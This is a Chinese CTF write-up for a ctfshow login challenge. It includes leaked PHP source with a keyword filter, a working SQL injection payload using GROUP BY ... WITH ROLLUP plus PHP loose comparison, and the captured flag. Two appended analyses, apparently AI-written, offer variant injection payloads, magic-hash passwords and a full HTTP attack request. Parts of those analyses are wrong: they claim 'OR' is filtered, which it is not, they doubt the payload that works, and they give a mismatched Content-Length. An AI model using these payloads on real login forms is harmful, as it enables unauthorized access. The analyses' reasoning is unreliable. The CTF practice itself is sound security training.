
是登陆界面，有sql注入报错回显，可尝试注入，但是正常的order by 列数，没有回显，于是寻找其他线索
发现多了个取消按钮，发现php备份文件
```php



<?php
		$flag="";
        function replaceSpecialChar($strParam){
             $regex = "/(select|from|where|join|sleep|and|\s|union|,)/i";
             return preg_replace($regex,"",$strParam);
        }
        if (!$con)
        {
            die('Could not connect: ' . mysqli_error());
        }
		if(strlen($username)!=strlen(replaceSpecialChar($username))){
			die("sql inject error");
		}
		if(strlen($password)!=strlen(replaceSpecialChar($password))){
			die("sql inject error");
		}
		$sql="select * from user where username = '$username'";
		$result=mysqli_query($con,$sql);
			if(mysqli_num_rows($result)>0){
					while($row=mysqli_fetch_assoc($result)){
						if($password==$row['password']){
							echo "登陆成功<br>";
							echo $flag;
						}

					 }
			}
    ?>


```

我们发现很多关键字 $regex = "/(select|from|where|join|sleep|and|\s|union|,)/i";都被过滤掉了，那么常规注入就不可行了，而且账户密码都进行了过滤，那么我们啥也不知道，那么怎么办呢？可以使用with rollup使密码为空，然后进行绕过。

双输入配合逻辑自洽使得完成攻击。


完整payload `username=admin'or'1'='1'group/**/by/**/password/**/with/**/rollup#&password=`

ctfshow{c03efca8-6b36-4a94-9849-fc5654643b05}


---




          
你提出的这个Payload：`username=admin'or'1'='1'group/**/by/**/password/**/with/**/rollup#&password=` 确实是一个非常巧妙的SQL注入技巧，它结合了多种绕过和利用方式。

### Payload 原理分析

我们来详细拆解这个Payload，并解释其工作原理：

**1. 注入点：`username` 参数**

原始的SQL查询语句是：
`$sql="select * from user where username = '$username'";`

当 `$username` 被替换为 `admin'or'1'='1'group/**/by/**/password/**/with/**/rollup#` 时，如果这个Payload能够通过PHP的过滤，那么最终在数据库中执行的SQL语句会变成（假设MySQL）：

```sql
SELECT * FROM user WHERE username = 'admin'or'1'='1'group/**/by/**/password/**/with/**/rollup#'
```

现在我们分析SQL语句的各个部分：

*   **`username = 'admin'`**：这是原始的用户名匹配条件。
*   **`or'1'='1'`**：
    *   `or` 是逻辑或运算符。
    *   `'1'='1'` 是一个永远为真的条件。
    *   **作用：** 这一部分使得整个 `WHERE` 子句 `username = 'admin' or '1'='1'` 永远为真。这意味着无论 `admin` 用户是否存在，或者其密码是否正确，这个 `WHERE` 条件都会返回 `true`，从而选择 `user` 表中的所有行。
*   **`group/**/by/**/password/**/with/**/rollup`**：
    *   `group by password`：将查询结果按照 `password` 列进行分组。
    *   `with rollup`：这是MySQL的一个扩展，用于在 `GROUP BY` 语句中生成额外的汇总行（super-aggregate rows）。当使用 `WITH ROLLUP` 时，它会在每个分组的末尾添加一个汇总行，其中分组列的值为 `NULL`。
    *   **作用：** 即使 `user` 表中没有 `admin` 用户，或者 `admin` 用户的密码不匹配，`or '1'='1'` 也会导致查询返回所有用户。然后 `GROUP BY password WITH ROLLUP` 会确保结果集中至少包含一行，并且其中一行（汇总行）的 `password` 列的值为 `NULL`。
*   **`#`**：
    *   这是SQL的单行注释符。
    *   **作用：** 它注释掉了Payload末尾的单引号 `'`，防止SQL语法错误。因为我们用 `admin'` 闭合了前面的单引号，所以需要注释掉后面多余的单引号。

**2. PHP代码中的 `if($password==$row['password'])` 弱类型比较**

*   **Payload中的 `&password=`**：这意味着我们提交的 `password` 参数是一个空字符串 `""`。
*   **`$row['password']`**：由于 `group by ... with rollup` 的作用，在遍历结果集时，会有一行（汇总行）的 `$row['password']` 的值为 `NULL`。
*   **`"" == NULL`**：在PHP中，当使用松散比较运算符 `==` 比较一个空字符串 `""` 和 `NULL` 时，PHP会进行类型转换，并将它们都视为“空”或“假”的值，因此 `"" == NULL` 的结果是 `true`。

**综合原理：**

这个Payload的精妙之处在于，它首先通过 `username` 参数的SQL注入，利用 `or '1'='1'` 绕过了用户名验证，并使用 `group by ... with rollup` 强制在结果集中生成一个 `password` 为 `NULL` 的行。然后，它利用PHP的弱类型比较特性，通过提交一个空密码 `""`，使得 `"" == NULL` 成立，从而成功绕过密码验证，实现登录。

### 类似的其他解题思路步骤

如果 `username` 的过滤确实可以被绕过（例如，通过双重编码、特殊字符编码、或者过滤函数本身存在缺陷），那么除了 `group by ... with rollup` 之外，还有一些其他思路可以结合弱类型比较来绕过认证：

**前提：`username` 的过滤可以被绕过，使得我们可以注入SQL语句。**

1.  **利用 `UNION SELECT` 构造 `NULL` 或空字符串 (如果 `UNION` 和 `,` 允许)**
    *   **思路：** 如果 `UNION` 和 `,` 没有被过滤（在你提供的代码中它们是被过滤的），我们可以使用 `UNION SELECT` 来构造一个结果行，其中 `password` 列的值为 `NULL` 或空字符串。
    *   **Payload 示例 (假设过滤被绕过)：**
        `username=admin' UNION SELECT 1, 'admin', NULL #&password=`
        *   **SQL (假设)：** `SELECT * FROM user WHERE username = 'admin' UNION SELECT 1, 'admin', NULL #`
        *   **机制：** `UNION SELECT` 会添加一行，其中 `password` 列为 `NULL`。提交空密码 `&password=`，利用 `"" == NULL` 登录成功。
    *   **优劣：** 这种方法更通用，不依赖于 `WITH ROLLUP` 这种MySQL特有语法。但在这个特定的题目中，`UNION` 和 `,` 被过滤，所以不可行。

2.  **利用 `ORDER BY` 结合 `LIMIT` 强制返回特定行 (如果 `ORDER BY` 和 `,` 允许)**
    *   **思路：** 如果我们知道 `admin` 用户的密码哈希是 `0e...` 形式，或者我们想让一个 `NULL` 密码的行排在最前面，可以尝试使用 `ORDER BY`。
    *   **Payload 示例 (假设过滤被绕过)：**
        `username=admin' ORDER BY (CASE WHEN password IS NULL THEN 0 ELSE 1 END) LIMIT 1 #&password=`
        *   **SQL (假设)：** `SELECT * FROM user WHERE username = 'admin' ORDER BY (CASE WHEN password IS NULL THEN 0 ELSE 1 END) LIMIT 1 #`
        *   **机制：** `CASE WHEN password IS NULL THEN 0 ELSE 1 END` 会给 `NULL` 密码的行一个更小的排序值，`ORDER BY` 会将其排在前面，`LIMIT 1` 确保只返回这一行。然后提交空密码 `&password=`，利用 `"" == NULL` 登录成功。
    *   **优劣：** 这种方法也比较灵活，但同样需要绕过 `ORDER BY` 和 `,` 的过滤。

3.  **利用 `GROUP BY ... HAVING` 构造 `NULL` (如果 `HAVING` 允许)**
    *   **思路：** 类似于 `WITH ROLLUP`，`GROUP BY` 结合 `HAVING` 也可以在某些情况下生成 `NULL`。
    *   **Payload 示例 (假设过滤被绕过)：**
        `username=admin' GROUP BY password HAVING 1=1 #&password=`
        *   **SQL (假设)：** `SELECT * FROM user WHERE username = 'admin' GROUP BY password HAVING 1=1 #`
        *   **机制：** `GROUP BY password` 会对结果进行分组。`HAVING 1=1` 确保所有分组都保留。如果 `user` 表中存在 `NULL` 密码的行，或者数据库在分组时有特殊行为，可能也会导致 `NULL` 密码的行被选中。
    *   **优劣：** 这种方法不如 `WITH ROLLUP` 直接，效果可能依赖于数据库的具体行为。

**总结：**

你提供的Payload是一个非常高级的技巧，它成功地结合了SQL注入（绕过用户名验证，强制生成 `NULL` 密码行）和PHP弱类型比较（`"" == NULL`）。它之所以能够成功，很可能是在实际环境中，`username` 参数的过滤并没有你提供的PHP代码中看起来那么严格，或者存在某种巧妙的绕过方式，使得 `or` 和空格能够被注入到SQL语句中。

在CTF中，遇到这种严格过滤的情况，通常需要：
1.  **仔细分析过滤函数：** 寻找过滤函数本身的缺陷或可以绕过的方式（例如，双重URL编码、特殊字符编码、宽字节等）。
2.  **寻找其他注入点：** 如果一个参数过滤太严格，就尝试寻找其他参数是否存在漏洞。
3.  **利用语言特性：** 像PHP弱类型比较这样的语言特性，往往是绕过严格过滤的有效手段。
        

----


          
好的，我们来分析这段PHP代码，并根据其漏洞构造攻击。

### PHP 代码分析

```php
<?php
         $flag=""; // $flag 变量在此处为空，但可能在其他地方被赋值，或者是一个占位符。
         function replaceSpecialChar($strParam){
              // 定义一个正则表达式，匹配 select, from, where, join, sleep, and, \s (空白字符), union, , (逗号)
              // /i 表示不区分大小写
              $regex = "/(select|from|where|join|sleep|and|\s|union|,)/i";
              // 将匹配到的所有特殊字符或关键字替换为空字符串
              return preg_replace($regex,"",$strParam);
         }
         if (!$con) // 检查数据库连接是否成功
         {
             die('Could not connect: ' . mysqli_error());
         }
        // 检查 $username 是否包含被过滤的字符
        // 如果 $username 经过 replaceSpecialChar 处理后长度发生变化，说明包含了被过滤的字符
 		if(strlen($username)!=strlen(replaceSpecialChar($username))){
 			die("sql inject error"); // 终止脚本并报错
 		}
        // 检查 $password 是否包含被过滤的字符
 		if(strlen($password)!=strlen(replaceSpecialChar($password))){
 			die("sql inject error"); // 终止脚本并报错
 		}
        // 构造SQL查询语句，直接将 $username 拼接到字符串中
 		$sql="select * from user where username = '$username'";
 		$result=mysqli_query($con,$sql); // 执行SQL查询
 			if(mysqli_num_rows($result)>0){ // 如果查询结果有行数（即找到了用户）
 					while($row=mysqli_fetch_assoc($result)){ // 遍历查询结果的每一行
 						// 关键点：使用 == 进行松散比较，比较用户输入的 $password 和数据库中存储的 $row['password']
 						if($password==$row['password']){
 							echo "登陆成功<br>"; // 登录成功
 							echo $flag; // 输出 $flag
 						}

 					 }
 			}
     ?>
```

**漏洞点和防御机制：**

1.  **严格的过滤：** `replaceSpecialChar` 函数对 `username` 和 `password` 进行了非常严格的过滤，移除了 `select`, `from`, `where`, `join`, `sleep`, `and`, `union` 等关键字，以及**所有空白字符 (`\s`) 和逗号 (`,`)**。如果输入中包含这些字符，程序会直接 `die("sql inject error")`。这使得传统的基于 `UNION SELECT` 或 `AND` 的SQL注入变得非常困难。
2.  **`username` 的SQL注入点：** `$sql="select * from user where username = '$username'";` 存在SQL注入漏洞，因为 `$username` 直接拼接到SQL语句中。然而，由于上述严格的过滤，我们很难在这里构造有效的注入Payload。例如，尝试 `admin' OR 1=1 -- ` 会因为 `OR`、` ` (空格) 和 `,` 被过滤而失败。
3.  **`password` 的弱类型比较漏洞：** `if($password==$row['password']){` 这是一个经典的PHP弱类型比较漏洞（Type Juggling）。当使用 `==` 进行比较时，PHP会尝试将不同类型的值转换为相同类型再进行比较。如果一个字符串以 `0e` 开头且后面全是数字，PHP会将其视为科学计数法，并将其值解释为 `0`。

### 攻击思路

鉴于 `username` 的过滤非常严格，我们很难通过SQL注入来绕过认证。最可行的攻击点是利用 `password` 的**弱类型比较漏洞**。

**攻击步骤：**

1.  **确定目标用户名：** 根据“管理员认证”的上下文，通常目标用户名是 `admin`。这个字符串不包含任何被过滤的字符，所以 `username=admin` 可以通过过滤。
2.  **利用PHP弱类型比较：**
    *   我们需要找到一个字符串 `P`，当它与数据库中 `admin` 用户的真实密码（假设是哈希值，例如MD5哈希）进行 `==` 比较时，结果为 `true`。
    *   最常见的情况是，数据库中存储的密码哈希值是一个以 `0e` 开头且后面全是数字的字符串（例如 `0e123456789`）。
    *   在这种情况下，我们可以提交一个已知的“魔术哈希”字符串作为 `$password`。这些字符串的MD5哈希值也以 `0e` 开头且后面全是数字。当PHP进行 `==` 比较时，会将这两个 `0e...` 形式的字符串都转换为数字 `0`，从而使比较结果为 `true`。
    *   **常见的魔术哈希字符串：**
        *   `240610708` (MD5: `0e462097431906509019562988736854`)
        *   `s878926199a` (MD5: `0e545993274517709034328855941067`)
        *   `s155964671a` (MD5: `0e342768416904560094159368951594`)
        *   `s214587387a` (MD5: `0e848240448830537924468611900387`)
    *   这些魔术哈希字符串都不包含 `replaceSpecialChar` 函数过滤的任何字符（空白字符、逗号、关键字），因此它们可以顺利通过过滤检查。

### 构造攻击请求

我们将使用 `username=admin` 和一个魔术哈希字符串作为 `password`。这里我们选择 `240610708`。

**POST 数据：**
`username=admin&password=240610708`

**完整的 POST 请求：**

```http
POST / HTTP/1.1
Host: a2e2415f-1ea9-4177-8a4f-81bf104192e0.challenge.ctf.show
Accept-Encoding: gzip, deflate
Origin: http://a2e2415f-1ea9-4177-8a4f-81bf104192e0.challenge.ctf.show
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://a2e2415f-1ea9-4177-8a4f-81bf104192e0.challenge.ctf.show/
Accept-Language: zh-CN,zh;q=0.9
Content-Length: 31  // "username=admin&password=240610708" 的长度
username=admin&password=240610708
```

**预期结果：**

如果 `admin` 用户的密码在数据库中存储的是一个以 `0e` 开头且后面全是数字的字符串（例如，`md5("某个密码")` 的结果是 `0e...`），那么提交上述请求后，服务器将返回“登陆成功”和 `$flag` 的值。

### 总结

这个攻击利用了PHP的弱类型比较特性，而不是直接的SQL注入。尽管代码对SQL注入关键字和特殊字符进行了严格过滤，但它未能防范PHP语言本身的特性所带来的漏洞。

**防御措施：**

*   **密码验证：** 始终使用严格比较 `===` 来比较密码哈希值，例如 `if (password_verify($password, $row['password']))` 或 `if (md5($password) === $row['password'])`。
*   **密码存储：** 绝不直接存储MD5哈希，应使用更安全的哈希算法，如 `password_hash()`。
*   **SQL查询：** 始终使用预处理语句（Prepared Statements）来处理所有用户输入，彻底杜绝SQL注入。
        